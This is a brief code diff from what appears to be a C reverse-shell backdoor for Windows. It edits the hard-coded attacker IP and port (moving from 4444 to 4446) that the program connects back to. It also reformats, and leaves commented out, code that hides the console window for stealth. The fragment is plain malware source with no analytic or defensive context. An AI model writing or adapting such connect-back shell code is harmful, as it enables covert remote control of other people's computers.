@@ -48,16 +48,16 @@ void Shell()
 
 int main()
 {
-    //HWND stealth;
-    //AllocConsole();
-    //stealth = FindWindowA("ConsoleWindowClass", NULL);
-    //ShowWindow(stealth, 0);
+//    HWND stealth;
+//    AllocConsole();
+//    stealth = FindWindowA("ConsoleWindowClass", NULL);
+//    ShowWindow(stealth, 0);
     struct sockaddr_in ServAddr;
     unsigned short ServPort;
     char *ServIP;
     WSADATA wsaData;
-    ServIP = "192.168.96.132";
-    ServPort = 4444;
+    ServIP = "192.168.96.166";
+    ServPort = 4446;
     if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
     {
         exit(1);
